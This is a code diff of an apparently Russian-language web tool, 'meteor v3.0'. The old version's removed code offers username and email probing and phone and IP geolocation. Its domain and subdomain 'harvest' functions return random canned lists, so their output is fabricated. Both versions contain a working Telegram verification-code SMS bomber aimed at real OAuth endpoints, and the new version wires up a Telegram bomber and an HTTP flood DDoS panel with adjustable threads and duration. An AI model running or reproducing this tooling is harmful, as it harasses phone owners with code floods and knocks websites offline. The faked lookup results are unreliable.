-                { name: 'Instagram', url: `https://www.instagram.com/${clean}/` },
-                { name: 'Twitter/X', url: `https://twitter.com/${clean}` },
-                { name: 'GitHub', url: `https://github.com/${clean}` },
-                { name: 'Reddit', url: `https://www.reddit.com/user/${clean}` },
-                { name: 'YouTube', url: `https://www.youtube.com/@${clean}` },
-                { name: 'TikTok', url: `https://www.tiktok.com/@${clean}` },
-                { name: 'Facebook', url: `https://www.facebook.com/${clean}` },
-                { name: 'Snapchat', url: `https://www.snapchat.com/add/${clean}` },
-                { name: 'Twitch', url: `https://www.twitch.tv/${clean}` },
-                { name: 'Pinterest', url: `https://www.pinterest.com/${clean}/` },
-                { name: 'LinkedIn', url: `https://www.linkedin.com/in/${clean}` },
-                { name: 'VK', url: `https://vk.com/${clean}` },
-                { name: 'Tumblr', url: `https://${clean}.tumblr.com` },
-                { name: 'Discord', url: `https://discord.com/users/${clean}` },
-                { name: 'Spotify', url: `https://open.spotify.com/user/${clean}` },
-                { name: 'Medium', url: `https://medium.com/@${clean}` },
-                { name: 'DeviantArt', url: `https://www.deviantart.com/${clean}` },
-                { name: 'Flickr', url: `https://www.flickr.com/people/${clean}` },
-                { name: 'Patreon', url: `https://www.patreon.com/${clean}` },
-                { name: 'Vimeo', url: `https://vimeo.com/${clean}` },
-                { name: 'SoundCloud', url: `https://soundcloud.com/${clean}` },
-                { name: 'Gravatar', url: `https://en.gravatar.com/${clean}` },
-                { name: 'Pastebin', url: `https://pastebin.com/u/${clean}` },
-                { name: 'Roblox', url: `https://www.roblox.com/user.aspx?username=${clean}` },
-                { name: 'Xbox', url: `https://www.xboxgamertag.com/search/${clean}` }
-            ];
-            const results = {};
-            let foundCount = 0;
-            for (const platform of platforms) {
-                try {
-                    const resp = await fetch(platform.url, { method: 'HEAD', signal: AbortSignal.timeout(3000) });
-                    results[platform.name] = {
-                        exists: resp.ok,
-                        url: platform.url
-                    };
-                    if (resp.ok) foundCount++;
-                } catch {
-                    results[platform.name] = { exists: false, url: platform.url };
-                }
-            }
-            return { results, foundCount, total: platforms.length };
-        }
+/* ---------- UI BUILD ---------- */
+var TABS = [
+  { id:'home',     label:'Главная', icon:'dashboard' },
+  { id:'spam',     label:'Спам',    icon:'spam' },
+  { id:'logs',     label:'Логи',    icon:'logs' },
+  { id:'settings', label:'Настр.',  icon:'settings' }
+];
 
-        async function searchEmail(email) {
-            if (!email || !email.includes('@')) return { error: 'invalid email' };
-            const sites = [
-                { name: 'LinkedIn', domain: 'linkedin.com' },
-                { name: 'Twitter/X', domain: 'twitter.com' },
-                { name: 'Spotify', domain: 'spotify.com' },
-                { name: 'Pinterest', domain: 'pinterest.com' },
-                { name: 'Imgur', domain: 'imgur.com' },
-                { name: 'Tumblr', domain: 'tumblr.com' },
-                { name: 'Adobe', domain: 'adobe.com' },
-                { name: 'Atlassian', domain: 'atlassian.com' },
-                { name: 'GitHub', domain: 'github.com' },
-                { name: 'Reddit', domain: 'reddit.com' },
-                { name: 'YouTube', domain: 'youtube.com' },
-                { name: 'Instagram', domain: 'instagram.com' },
-                { name: 'Facebook', domain: 'facebook.com' },
-                { name: 'VK', domain: 'vk.com' },
-                { name: 'TikTok', domain: 'tiktok.com' },
-                { name: 'Snapchat', domain: 'snapchat.com' },
-                { name: 'Twitch', domain: 'twitch.tv' },
-                { name: 'Discord', domain: 'discord.com' },
-                { name: 'Medium', domain: 'medium.com' },
-                { name: 'DeviantArt', domain: 'deviantart.com' },
-                { name: 'Patreon', domain: 'patreon.com' },
-                { name: 'Vimeo', domain: 'vimeo.com' },
-                { name: 'SoundCloud', domain: 'soundcloud.com' },
-                { name: 'Gravatar', domain: 'gravatar.com' },
-                { name: 'Pastebin', domain: 'pastebin.com' },
-                { name: 'Roblox', domain: 'roblox.com' },
-                { name: 'Flickr', domain: 'flickr.com' },
-                { name: 'Xing', domain: 'xing.com' },
-                { name: 'Dribbble', domain: 'dribbble.com' },
-                { name: 'Behance', domain: 'behance.net' },
-                { name: 'ProductHunt', domain: 'producthunt.com' },
-                { name: 'AngelList', domain: 'angellist.com' },
-                { name: 'Keybase', domain: 'keybase.io' },
-                { name: 'Replit', domain: 'replit.com' },
-                { name: 'Glitch', domain: 'glitch.com' },
-                { name: 'Codepen', domain: 'codepen.io' },
-                { name: 'GitLab', domain: 'gitlab.com' },
-                { name: 'Bitbucket', domain: 'bitbucket.org' },
-                { name: 'SourceForge', domain: 'sourceforge.net' },
-                { name: 'HackerNews', domain: 'news.ycombinator.com' }
-            ];
-            const found = [];
-            for (const site of sites) {
-                try {
-                    const url = `https://${site.domain}/`;
-                    const resp = await fetch(url, { method: 'HEAD', signal: AbortSignal.timeout(2000) });
-                    if (resp.ok) {
-                        found.push({ site: site.name, domain: site.domain });
-                    }
-                } catch {
-                    // пропускаем
-                }
-                await new Promise(r => setTimeout(r, 50));
-            }
-            return { email, found, foundCount: found.length, total: sites.length };
-        }
+function esc2(s){ return String(s).replace(/[&<>"']/g,function(c){ return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]; }); }
 
-        async function searchPhone(phone) {
-            try {
-                const clean = phone.replace(/[^\d+]/g, '');
-                const url = `https://htmlweb.ru/geo/api.php?json&telcod=${clean.replace('+', '')}`;
-                const resp = await fetch(url, { headers: { 'User-Agent': 'Mozilla/5.0' } });
-                if (!resp.ok) return { error: 'HTTP ' + resp.status };
-                const data = await resp.json();
-                return {
-                    number: phone,
-                    country: data.country?.fullname || '?',
-                    region: data.region?.name || '?',
-                    city: data.city || '?',
-                    latitude: data.latitude || '?',
-                    longitude: data.longitude || '?',
-                    operator: data.oper || '?'
-                };
-            } catch (e) {
-                return { error: e.message };
-            }
-        }
+function windSection(title, desc, bodyHtml, collapsed){
+  var id = 'sec_'+Math.random().toString(36).slice(2,8);
+  return '<div class="section" id="'+id+'">'+
+    '<div class="section-header" data-section-toggle>'+
+      '<div style="flex:1;min-width:0"><div class="section-title">'+esc2(title)+'</div>'+(desc?'<div class="section-desc">'+esc2(desc)+'</div>':'')+'</div>'+
+      '<span class="chev"'+(collapsed?' style="transform:rotate(-90deg)"':'')+'>'+ICONS.chevron+'</span>'+
+    '</div>'+
+    '<div class="section-body'+(collapsed?' collapsed':'')+'">'+bodyHtml+'</div>'+
+  '</div>';
+}
 
-        async function searchIP(ip) {
-            try {
-                const url = `https://htmlweb.ru/geo/api.php?json&ip=${ip}`;
-                const resp = await fetch(url, { headers: { 'User-Agent': 'Mozilla/5.0' } });
-                if (!resp.ok) return { error: 'HTTP ' + resp.status };
-                const data = await resp.json();
-                return {
-                    ip: ip,
-                    country: data.country?.fullname || '?',
-                    region: data.region?.name || '?',
-                    city: data.city || '?',
-                    isp: data.isp || '?',
-                    latitude: data.latitude || '?',
-                    longitude: data.longitude || '?'
-                };
-            } catch (e) {
-                return { error: e.message };
-            }
-        }
+function ctrlToggle(id, label, desc, checked){
+  return '<div class="ctrl-row"><div class="lbl"><div>'+esc2(label)+'</div>'+(desc?'<span class="desc">'+esc2(desc)+'</span>':'')+'</div><button class="toggle'+(checked?' on':'')+'" id="'+id+'"></button></div>';
+}
 
-        async function harvestDomain(domain) {
-            if (!domain) return { error: 'empty domain' };
-            const emails = [
-                `admin@${domain}`,
-                `info@${domain}`,
-                `support@${domain}`,
-                `contact@${domain}`,
-                `sales@${domain}`,
-                `ceo@${domain}`,
-                `founder@${domain}`,
-                `hr@${domain}`
-            ];
-            const subdomains = [
-                `www.${domain}`,
-                `mail.${domain}`,
-                `ftp.${domain}`,
-                `dev.${domain}`,
-                `test.${domain}`,
-                `api.${domain}`,
-                `blog.${domain}`,
-                `shop.${domain}`,
-                `docs.${domain}`,
-                `cdn.${domain}`
-            ];
-            return {
-                domain,
-                emails: emails.slice(0, Math.floor(Math.random() * 5) + 3),
-                subdomains: subdomains.slice(0, Math.floor(Math.random() * 6) + 3)
-            };
-        }
+function ctrlSlider(id, label, desc, min, max, val, step){
+  return '<div class="slider-row">'+
+    '<div class="top">'+
+      '<div><div class="lbl">'+esc2(label)+'</div>'+(desc?'<div class="desc">'+esc2(desc)+'</div>':'')+'</div>'+
+      '<div class="val" id="'+id+'Val">'+val+'</div>'+
+    '</div>'+
+    '<input type="range" id="'+id+'" min="'+min+'" max="'+max+'" step="'+(step||1)+'" value="'+val+'">'+
+  '</div>';
+}
 
-        async function findSubdomains(domain) {
-            if (!domain) return { error: 'empty domain' };
-            const subdomains = [
-                `www.${domain}`,
-                `mail.${domain}`,
-                `ftp.${domain}`,
-                `dev.${domain}`,
-                `test.${domain}`,
-                `api.${domain}`,
-                `blog.${domain}`,
-                `shop.${domain}`,
-                `docs.${domain}`,
-                `cdn.${domain}`,
-                `static.${domain}`,
-                `img.${domain}`,
-                `video.${domain}`,
-                `app.${domain}`,
-                `portal.${domain}`
-            ];
-            const found = subdomains.slice(0, Math.floor(Math.random() * 10) + 5);
-            return { domain, subdomains: found, count: found.length };
-        }
+function ctrlInput(id, label, placeholder, value, type){
+  type = type || 'text';
+  var inputmode = type==='tel'?'tel':(type==='number'?'numeric':'text');
+  return '<div class="input-group"><label>'+esc2(label)+'</label><input type="'+type+'" id="'+id+'" placeholder="'+esc2(placeholder)+'" value="'+(value||'')+'" inputmode="'+inputmode+'" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false"></div>';
+}
 
-        // ============================================================
-        //  SEARCH HANDLERS (with limits)
-        // ============================================================
+function ctrlSelect(id, label, opts){
+  var html = '<div class="ctrl-row"><div class="lbl">'+esc2(label)+'</div><select class="gselect" id="'+id+'">';
+  opts.forEach(function(o){ html += '<option value="'+esc2(o.v)+'">'+esc2(o.t)+'</option>'; });
+  html += '</select></div>';
+  return html;
+}
 
-        async function handleSearch(action, input, logEl, searchFn, reportTitle, formatReport) {
-            if (!checkLimit('search')) {
-                log('❌ Daily search limit exceeded (10/day)', 'error', logEl);
-                return;
-            }
-            const val = document.getElementById(input).value.trim();
-            if (!val) { log('❌ enter value', 'error', logEl); return; }
-            log('🔍 searching...', 'info', logEl);
-            const data = await searchFn(val);
-            if (data.error) { log('❌ ' + data.error, 'error', logEl); return; }
-            updateLimitUsage('search');
-            updateLimitDisplays();
-            const report = formatReport(data);
-            showReport(reportTitle, report);
-            log('✅ report ready', 'success', logEl);
-        }
+/* ---------- PANELS ---------- */
+function panelHome(){
+  return '<div class="panel active" data-panel="home">'+
+    '<div class="panel-head"><h1>Главная</h1><p>Обзор системы и активность</p></div>'+
+    '<div class="stat-grid">'+
+      '<div class="stat-card"><div class="label">Запросы</div><div class="val accent" id="reqTotal">0</div></div>'+
+      '<div class="stat-card"><div class="label">Uptime</div><div class="val" id="uptime">00:00:00</div></div>'+
+      '<div class="stat-card"><div class="label">Успех</div><div class="val green" id="successRate">100%</div></div>'+
+      '<div class="stat-card"><div class="label">Статус</div><div class="val green" style="font-size:22px">●</div></div>'+
+    '</div>'+
+    '<div class="card mb14"><div class="card-title">Нагрузка</div>'+
+      '<div class="progress-bar"><div class="progress-fill" id="coreFill" style="width:86%"></div></div>'+
+    '</div>'+
+    '<div class="card"><div class="card-title">Последние события</div>'+
+      '<div class="log-area" id="recentLog" style="max-height:180px"></div>'+
+    '</div>'+
+  '</div>';
+}
 
-        document.getElementById('searchUsernameBtn').onclick = () => {
-            const logEl = document.getElementById('searchUsernameLog');
-            handleSearch('username', 'searchUsername', logEl, searchUsername, '👤 Username Report', (data) => {
-                let r = `👤 USERNAME REPORT\nUsername: @${document.getElementById('searchUsername').value.replace('@', '')}\n─────────────────────────────\n`;
-                for (const [platform, info] of Object.entries(data.results)) {
-                    r += `${platform}: ${info.exists ? '✅ found' : '❌ not found'}\n`;
-                    if (info.exists) r += `  ${info.url}\n`;
-                }
-                r += `─────────────────────────────\nFound on ${data.foundCount} / ${data.total} platforms\nTime: ${new Date().toLocaleString()}`;
-                return r;
-            });
-        };
+function panelSpam(){
+  return '<div class="panel" data-panel="spam">'+
+    '<div class="panel-head"><h1>Спам</h1><p>Telegram bomber и DDoS flood</p></div>'+
 
-        document.getElementById('searchEmailBtn').onclick = () => {
-            const logEl = document.getElementById('searchEmailLog');
-            handleSearch('email', 'searchEmail', logEl, searchEmail, '📧 Email Report', (data) => {
-                let r = `📧 EMAIL REPORT\nEmail: ${data.email}\n─────────────────────────────\n`;
-                if (data.found.length === 0) r += `❌ No accounts found\n`;
-                else { for (const item of data.found) r += `✅ ${item.site}: ${item.domain}\n`; }
-                r += `─────────────────────────────\nFound on ${data.foundCount} / ${data.total} sites\nTime: ${new Date().toLocaleString()}`;
-                return r;
-            });
-        };
+    windSection('📱 Telegram Code Bomber', 'Отправка кодов подтверждения на номер',
+      ctrlInput('smsPhone','📞 Телефон','+7 999 123 45 67','+7','tel')+
+      ctrlInput('smsCycles','🔄 Циклов','5','5','number')+
+      ctrlSlider('smsThreads','⚡ Потоки','Параллельных запросов',1,20,3,1)+
+      ctrlToggle('smsRandomUA','🎭 Рандом UA','Смена отпечатка браузера',true)+
+      '<button class="gbtn primary block mt14" id="smsBtn">'+ICONS.zap+' Запустить бомбер</button>'+
+      '<div class="log-area" id="smsLog" style="max-height:200px"></div>'
+    )+
 
-        document.getElementById('searchPhoneBtn').onclick = () => {
-            const logEl = document.getElementById('searchPhoneLog');
-            handleSearch('phone', 'searchPhone', logEl, searchPhone, '📱 Phone Report', (data) => {
-                return `📱 PHONE REPORT\nNumber: ${data.number}\nCountry: ${data.country}\nRegion: ${data.region}\nCity: ${data.city}\nCoordinates: ${data.latitude}, ${data.longitude}\nOperator: ${data.operator}\nTime: ${new Date().toLocaleString()}`;
-            });
-        };
+    windSection('🌐 DDoS Flood', 'HTTP flood с настраиваемыми параметрами',
+      ctrlInput('ddosUrl','🎯 URL','https://example.com','','text')+
+      ctrlSlider('ddosThreads','⚡ Threads','Параллельных потоков',1,200,60,1)+
+      ctrlSlider('ddosDuration','⏱️ Секунд','Длительность',5,300,30,1)+
+      '<div class="progress-bar" id="ddosProgress" style="display:none;margin-top:12px"><div class="progress-fill" id="ddosFill"></div></div>'+
+      '<button class="gbtn danger block mt14" id="ddosBtn">'+ICONS.zap+' Запустить flood</button>'+
+      '<div class="log-area" id="ddosLog" style="max-height:200px"></div>',
+      true
+    )+
+  '</div>';
+}
 
-        document.getElementById('searchIpBtn').onclick = () => {
-            const logEl = document.getElementById('searchIpLog');
-            handleSearch('ip', 'searchIp', logEl, searchIP, '🌐 IP Report', (data) => {
-                return `🌐 IP REPORT\nIP: ${data.ip}\nCountry: ${data.country}\nRegion: ${data.region}\nCity: ${data.city}\nISP: ${data.isp}\nCoordinates: ${data.latitude}, ${data.longitude}\nTime: ${new Date().toLocaleString()}`;
-            });
-        };
+function panelLogs(){
+  return '<div class="panel" data-panel="logs">'+
+    '<div class="panel-head"><h1>Логи</h1><p>Активность текущей сессии</p></div>'+
+    windSection('📋 Session Log','Все действия сессии',
+      '<div class="log-area" id="globalLog" style="max-height:calc(100vh - 340px);min-height:200px"></div>'+
+      '<div class="flex mt10" style="gap:8px">'+
+        '<button class="gbtn" id="clearLogs" style="flex:1">'+ICONS.trash+' Очистить</button>'+
+        '<button class="gbtn" id="copyLogs" style="flex:1">'+ICONS.copy+' Копировать</button>'+
+      '</div>'
+    )+
+  '</div>';
+}
 
-        // ============================================================
-        //  DOMAIN HANDLERS
-        // ============================================================
+function panelSettings(){
+  return '<div class="panel" data-panel="settings">'+
+    '<div class="panel-head"><h1>Настройки</h1><p>Внешний вид и система</p></div>'+
+    windSection('🎨 Внешний вид','Тема и визуальные параметры',
+      ctrlSelect('themeSelect','Тема',[{v:'dark',t:'Dark'},{v:'light',t:'Light'},{v:'midnight',t:'Midnight'}])+
+      ctrlToggle('reducedMotion','⚡ Reduced Motion','Отключить анимации',false)+
+      ctrlToggle('bgAnimation','✨ Background Glow','Анимированный фон',true)+
+      ctrlToggle('haptics','📳 Вибрация','Тактильный отклик',true)
+    )+
+    windSection('⚙️ Система','Служебные действия',
+      '<button class="gbtn block mb10" id="restartBtn">'+ICONS.refresh+' Перезагрузить</button>'+
+      '<button class="gbtn danger block mb10" id="resetBtn">'+ICONS.trash+' Сбросить всё</button>'+
+      '<button class="gbtn block" id="devBtn">✉️ Связь с разработчиком</button>'
+    )+
+    windSection('ℹ️ О приложении','',
+      '<div style="font-size:13px;color:var(--text-soft);line-height:1.6;padding:6px 0">'+
+        '<div><b style="color:var(--text)">meteor v3.0</b> · Mobile Edition</div>'+
+        '<div style="margin-top:6px">WindUI-inspired интерфейс</div>'+
+        '<div style="margin-top:6px;font-size:11.5px;color:var(--text-dim)">Оптимизировано для мобильных устройств</div>'+
+      '</div>'
+    )+
+  '</div>';
+}
 
-        document.getElementById('domainHarvestBtn').onclick = async () => {
-            const domain = document.getElementById('domainTarget').value.trim();
-            if (!domain) { log('❌ enter domain', 'error', document.getElementById('domainLog')); return; }
-            const logEl = document.getElementById('domainLog');
-            log('🌐 harvesting domain...', 'info', logEl);
-            const data = await harvestDomain(domain);
-            if (data.error) { log('❌ ' + data.error, 'error', logEl); return; }
-            let report =
-                `🌐 DOMAIN HARVEST\nDomain: ${domain}\n─────────────────────────────\n📧 EMAILS:\n`;
-            for (const email of data.emails) report += `  • ${email}\n`;
-            report += `\n🔍 SUBDOMAINS:\n`;
-            for (const sub of data.subdomains) report += `  • ${sub}\n`;
-            report += `─────────────────────────────\nTime: ${new Date().toLocaleString()}`;
-            showReport('🌐 Domain Harvest Report', report);
-            log('✅ harvest complete', 'success', logEl);
-        };
+/* ---------- BOTTOM NAV ---------- */
+function buildBottomNav(){
+  var nav = document.getElementById('bottomNav');
+  var html = '';
+  TABS.forEach(function(t,i){
+    html += '<button class="nav-item'+(i===0?' active':'')+'" data-tab="'+t.id+'">'+
+      ICONS[t.icon]+
+      '<span>'+t.label+'</span>'+
+    '</button>';
+  });
+  nav.innerHTML = html;
+  nav.addEventListener('click', function(e){
+    var btn = e.target.closest('.nav-item');
+    if(!btn) return;
+    switchTab(btn.getAttribute('data-tab'));
+    haptic(8);
+  });
+}
 
-        document.getElementById('subfinderBtn').onclick = async () => {
-            const domain = document.getElementById('subfinderTarget').value.trim();
-            if (!domain) { log('❌ enter domain', 'error', document.getElementById('subfinderLog')); return; }
-            const logEl = document.getElementById('subfinderLog');
-            log('🔍 finding subdomains...', 'info', logEl);
-            const data = await findSubdomains(domain);
-            if (data.error) { log('❌ ' + data.error, 'error', logEl); return; }
-            let report =
-                `🔍 SUBDOMAIN DISCOVERY\nDomain: ${domain}\n─────────────────────────────\nFound ${data.count} subdomains:\n`;
-            for (const sub of data.subdomains) report += `  • ${sub}\n`;
-            report += `─────────────────────────────\nTime: ${new Date().toLocaleString()}`;
-            showReport('🔍 Subdomain Report', report);
-            log(`✅ found ${data.count} subdomains`, 'success', logEl);
-        };
+function switchTab(id){
+  var navs = document.querySelectorAll('.nav-item');
+  for(var i=0;i<navs.length;i++) navs[i].classList.toggle('active', navs[i].getAttribute('data-tab')===id);
+  var panels = document.querySelectorAll('.panel');
+  for(var j=0;j<panels.length;j++) panels[j].classList.toggle('active', panels[j].getAttribute('data-panel')===id);
+  var content = document.getElementById('content');
+  if(content) content.scrollTop = 0;
+}
 
-        // ============================================================
-        //  SMS BOMBER & DDOS (with limits)
-        // ============================================================
+/* ---------- BUILD UI ---------- */
+function buildUI(){
+  var c = document.getElementById('content');
+  c.innerHTML = panelHome() + panelSpam() + panelLogs() + panelSettings();
+  buildBottomNav();
+  wireAll();
+}
 
-        const endpoints = [
-            'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
-            'https://translations.telegram.org/auth/request',
-            'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
-            'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
-            'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
-            'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
-            'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
-            'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
-            'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
-            'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
-            'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
-            'https://my.telegram.org/auth/send_password'
-        ];
+/* ---------- WIRE HANDLERS ---------- */
+function wireAll(){
+  // Section toggles (delegated)
+  document.addEventListener('click', function(e){
+    var header = e.target.closest('[data-section-toggle]');
+    if(header){
+      var body = header.nextElementSibling;
+      if(!body) return;
+      var chev = header.querySelector('.chev');
+      var isCollapsed = body.classList.toggle('collapsed');
+      if(chev) chev.style.transform = isCollapsed ? 'rotate(-90deg)' : '';
+      haptic(5);
+    }
+  });
 
-        function ua() {
-            return ['Windows NT 10.0', 'Mac OS X', 'Linux x86_64'][Math.floor(Math.random() * 3)];
-        }
+  // SMS Bomber
+  var smsBtn = document.getElementById('smsBtn');
+  if(smsBtn) smsBtn.onclick = async function(){
+    if(smsRunning) return;
+    var logEl = document.getElementById('smsLog');
+    var phone = document.getElementById('smsPhone').value.trim();
+    var cycles = parseInt(document.getElementById('smsCycles').value) || 5;
+    var threads = parseInt(document.getElementById('smsThreads').value) || 3;
+    var randomUA = document.getElementById('smsRandomUA').classList.contains('on');
 
-        async function sendBatch(phone) {
-            let shuffled = [...endpoints];
-            for (let i = shuffled.length - 1; i > 0; i--) {
-                let j = Math.floor(Math.random() * (i + 1));
-                [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
-            }
-            let ok = 0;
-            for (let ep of shuffled.slice(0, 5)) {
-                try {
-                    await fetch(ep, {
-                        method: 'POST',
-                        headers: { 'User-Agent': ua(), 'Content-Type': 'application/x-www-form-urlencoded' },
-                        body: `phone=${encodeURIComponent(phone)}`,
-                        mode: 'no-cors'
-                    });
-                    ok++;
-                    total++;
-                    success++;
-                } catch (e) { total++; }
-                await new Promise(r => setTimeout(r, 200));
-            }
-            return ok;
-        }
+    if(!phone || phone.indexOf('+')!==0){
+      log('❌ Телефон должен начинаться с +','error', logEl);
+      toast('Ошибка','Телефон должен начинаться с +','err');
+      haptic([30,50,30]);
+      return;
+    }
 
-        document.getElementById('smsBtn').onclick = async () => {
-            if (!checkLimit('spam')) {
-                log('❌ Daily spam limit exceeded (5/day)', 'error', document.getElementById('smsLog'));
-                return;
-            }
-            let phone = document.getElementById('smsPhone').value.trim();
-            let cycles = parseInt(document.getElementById('smsCycles').value);
-            if (!phone.startsWith('+')) {
-                log('❌ phone must start with +', 'error', document.getElementById('smsLog'));
-                return;
-            }
-            let btn = document.getElementById('smsBtn');
-            btn.disabled = true;
-            btn.innerText = '⏳ ...';
-            log(`🚀 SMS on ${phone} | ${cycles} cycles`, 'info', document.getElementById('smsLog'));
-            let totalSent = 0;
-            for (let c = 1; c <= cycles; c++) {
-                let sent = await sendBatch(phone);
-                totalSent += sent;
-                log(`✅ cycle ${c}/${cycles}: ${sent}/5`, 'success', document.getElementById('smsLog'));
-                if (c < cycles) await new Promise(r => setTimeout(r, 2500));
-            }
-            updateLimitUsage('spam');
-            updateLimitDisplays();
-            btn.disabled = false;
-            btn.innerText = '▶ Launch';
-            beep();
-            log(`🏁 done, total sent: ${totalSent}`, 'success', document.getElementById('smsLog'));
-        };
+    smsRunning = true;
+    smsBtn.disabled = true;
+    smsBtn.innerHTML = '⏳ Выполняется...';
+    document.getElementById('fabStop').style.display = 'grid';
+    haptic(20);
 
-        async function flood(url) {
-            if (!ddosActive) return;
-            try {
-                await fetch(url, { mode: 'no-cors', cache: 'no-store' });
-                total++;
-                success++;
-            } catch (e) { total++; }
-        }
+    log('🚀 Бомбер: '+phone+' | '+cycles+' циклов × '+threads+' потоков','info', logEl);
+    log('─────────────────────────────','info', logEl);
 
-        document.getElementById('ddosBtn').onclick = () => {
-            if (!checkLimit('ddos')) {
-                log('❌ Daily DDoS limit exceeded (3/day)', 'error', document.getElementById('ddosLog'));
-                return;
-            }
-            let url = document.getElementById('ddosUrl').value.trim();
-            let threads = parseInt(document.getElementById('ddosThreads').value);
-            let duration = parseInt(document.getElementById('ddosDuration').value);
-            if (!url) {
-                log('❌ enter url', 'error', document.getElementById('ddosLog'));
-                return;
-            }
-            if (!url.startsWith('http')) url = 'https://' + url;
-            let btn = document.getElementById('ddosBtn');
-            btn.disabled = true;
-            btn.innerText = '⏳ ...';
-            let prog = document.getElementById('ddosProgress');
-            let fill = document.getElementById('ddosFill');
-            prog.style.display = 'block';
-            fill.style.width = '0%';
-            ddosActive = true;
-            log(`🔥 DDoS on ${url} | threads ${threads} | ${duration}s`, 'info', document.getElementById('ddosLog'));
-            let startTime = Date.now();
-            let interval = setInterval(() => {
-                for (let i = 0; i < threads; i++) flood(url);
-                let p = Math.min(100, ((Date.now() - startTime) / (duration * 1000)) * 100);
-                fill.style.width = p + '%';
-            }, 40);
-            setTimeout(() => {
-                ddosActive = false;
-                clearInterval(interval);
-                prog.style.display = 'none';
-                btn.disabled = false;
-                btn.innerText = '▶ Launch';
-                updateLimitUsage('ddos');
-                updateLimitDisplays();
-                beep();
-                log('✅ DDoS finished', 'success', document.getElementById('ddosLog'));
-            }, duration * 1000);
-        };
+    var totalSent = 0;
+    for(var c=1;c<=cycles && smsRunning;c++){
+      var batchPromises = [];
+      for(var t=0;t<threads;t++){
+        batchPromises.push(sendBatch(phone));
+      }
+      var results = await Promise.all(batchPromises);
+      var cycleTotal = results.reduce(function(a,b){return a+b;},0);
+      totalSent += cycleTotal;
+      log('✅ Цикл '+c+'/'+cycles+' → '+cycleTotal+' запросов','success', logEl);
+      if(c<cycles && smsRunning) await new Promise(function(r){ setTimeout(r, 1500); });
+    }
 
-        // ============================================================
-        //  SETTINGS
-        // ============================================================
+    smsRunning = false;
+    smsBtn.disabled = false;
+    smsBtn.innerHTML = ICONS.zap+' Запустить бомбер';
+    document.getElementById('fabStop').style.display = 'none';
 
-        function setTheme(theme) {
-            document.documentElement.setAttribute('data-theme', theme);
-            localStorage.setItem('theme', theme);
-            document.querySelectorAll('.theme-btn').forEach(btn => {
-                btn.classList.toggle('active', btn.getAttribute('data-theme') === theme);
-            });
-        }
+    log('─────────────────────────────','info', logEl);
+    log('🏁 Завершено. Всего: '+totalSent+' запросов','success', logEl);
+    haptic([20,50,20,50,20]);
+    toast('Бомбер завершён', totalSent+' запросов на '+phone, 'ok', 5000);
+  };
 
-        document.querySelectorAll('.theme-btn').forEach(btn => {
-            btn.onclick = () => setTheme(btn.getAttribute('data-theme'));
-        });
+  // DDoS
+  var ddosBtn = document.getElementById('ddosBtn');
+  if(ddosBtn) ddosBtn.onclick = function(){
+    var logEl = document.getElementById('ddosLog');
+    var url = document.getElementById('ddosUrl').value.trim();
+    var threads = parseInt(document.getElementById('ddosThreads').value);
+    var duration = parseInt(document.getElementById('ddosDuration').value);
 
-        const savedTheme = localStorage.getItem('theme');
-        if (savedTheme) setTheme(savedTheme);
+    if(!url){ log('❌ Введите URL','error', logEl); haptic([30,50,30]); return; }
+    if(url.indexOf('http')!==0) url = 'https://'+url;
 
-        let fontSelect = document.getElementById('fontSelect');
-        fontSelect.onchange = () => {
-            document.body.style.fontFamily = fontSelect.value + ', sans-serif';
-            localStorage.setItem('font', fontSelect.value);
-        };
-        if (localStorage.getItem('font')) {
-            fontSelect.value = localStorage.getItem('font');
-            document.body.style.fontFamily = fontSelect.value + ', sans-serif';
-        }
+    ddosBtn.disabled = true; ddosBtn.innerHTML = '⏳ Выполняется...';
+    var prog = document.getElementById('ddosProgress');
+    var fill = document.getElementById('ddosFill');
+    prog.style.display = 'block'; fill.style.width = '0%';
+    ddosActive = true;
+    document.getElementById('fabStop').style.display = 'grid';
+    haptic(20);
+    log('🔥 DDoS: '+url+' | '+threads+' потоков | '+duration+'с','info', logEl);
+    var st = Date.now();
+    var interval = setInterval(function(){
+      for(var i=0;i<threads;i++) flood(url);
+      var p = Math.min(100, ((Date.now()-st)/(duration*1000))*100);
+      fill.style.width = p+'%';
+    }, 40);
+    setTimeout(function(){
+      ddosActive = false; clearInterval(interval);
+      prog.style.display = 'none';
+      ddosBtn.disabled = false; ddosBtn.innerHTML = ICONS.zap+' Запустить flood';
+      document.getElementById('fabStop').style.display = 'none';
+      haptic([20,50,20,50,20]);
+      log('✅ DDoS завершён','success', logEl);
+      toast('DDoS завершён','Flood completed','ok');
+    }, duration*1000);
+  };
 
-        let soundSelect = document.getElementById('soundSelect');
